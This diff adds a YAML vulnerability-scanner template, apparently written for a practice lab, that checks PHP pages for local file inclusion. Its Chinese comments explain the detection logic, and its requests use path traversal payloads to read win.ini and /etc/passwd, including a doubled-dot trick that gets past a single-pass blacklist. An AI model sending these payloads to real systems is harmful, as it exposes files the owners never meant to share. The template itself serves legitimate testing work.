@@ -1,0 +1,101 @@
+id: vulnlab-lfi-path-traversal
+
+info:
+  name: 文件包含（路径穿越）
+  severity: high
+  author: hediwen
+  tags: [lfi, file-inclusion, path-traversal, injection]
+  description: |
+    include 的路径参数可被用户控制，且未限制可包含的范围，
+    导致能读取 Web 根之外的文件。
+
+    ⚠️ 本检测是**只读**的 —— 只读取一个系统自带的无害文件
+    （Windows 的 win.ini / Linux 的 /etc/passwd 开头），
+    不写文件、不执行代码、不做持久化。
+    这是文件包含类检测应该遵守的边界：证明「能读到不该读的」就够了。
+
+    ── 判据为什么用系统文件而不是 config.php ──
+
+    靶场的 config.php 被 include 时会【被执行】（它只定义常量和函数，不输出内容），
+    所以从响应里看不出它是否被成功包含 —— 判据会失效。
+
+    而 win.ini / /etc/passwd 是**纯文本**，被 include 时内容会原样输出：
+        Windows: [fonts] / for 16-bit app support
+        Linux:   root:x:0:0
+
+    这两个特征跨平台互补，任一命中即可确认路径穿越成立。
+  reference:
+    - https://owasp.org/www-community/attacks/Path_Traversal
+
+requests:
+  # ── ① Windows 目标：读 win.ini ────────────────────────────────
+  - method: GET
+    path:
+      # 从 html/lfi/pages/ 出发往上退 4 级到系统盘根
+      - "{{BaseURL}}/lfi/low.php?page=..%2F..%2F..%2F..%2FWindows%2Fwin.ini"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+
+      - type: word
+        part: body
+        words:
+          - "for 16-bit app support"
+          - "[fonts]"
+
+      # 排除「包含失败」的情况
+      - type: word
+        part: body
+        words:
+          - "包含失败"
+          - "Failed opening"
+        condition: or
+        negative: true
+
+    extractors:
+      - type: regex
+        part: body
+        name: file_content
+        regex:
+          - "(\\[fonts\\][\\s\\S]{0,80})"
+
+  # ── ② Linux 目标：读 /etc/passwd ──────────────────────────────
+  #
+  # 用绝对路径 —— 这说明拼接的前缀被完全绕过了。
+  - method: GET
+    path:
+      - "{{BaseURL}}/lfi/low.php?page=%2Fetc%2Fpasswd"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+
+  # ── ③ 双写绕过黑名单（medium 档）─────────────────────────────
+  #
+  # 单独一条：验证「黑名单 + 单次替换」这个组合的绕过。
+  - method: GET
+    path:
+      - "{{BaseURL}}/lfi/medium.php?page=....%2F%2F....%2F%2F..%2F..%2F..%2FWindows%2Fwin.ini"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+
+      - type: word
+        part: body
+        words:
+          - "for 16-bit app support"
+
+      - type: word
+        part: body
+        words: ["过滤器命中"]
+        negative: true
